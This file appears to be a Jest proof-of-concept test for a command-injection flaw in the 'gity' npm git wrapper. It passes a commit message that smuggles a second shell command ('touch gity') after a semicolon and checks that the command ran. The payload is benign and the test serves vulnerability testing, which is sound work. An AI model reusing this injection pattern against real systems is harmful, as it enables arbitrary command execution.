test("Remote code execution in gity", (done) => {
  expect.assertions(2);
  const Git = require("gity");
  const fs = require("fs");
  const path = "./gity";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let git = Git()
      .add("*.js")
      .commit('-m "added js files";touch gity;#')
      .run(() => {
        file_exist = fs.existsSync(path);
        expect(file_exist).toBe(true);
        fs.unlink(path, function (err) {
          done();
        });
      });
  } catch (error) {}
});
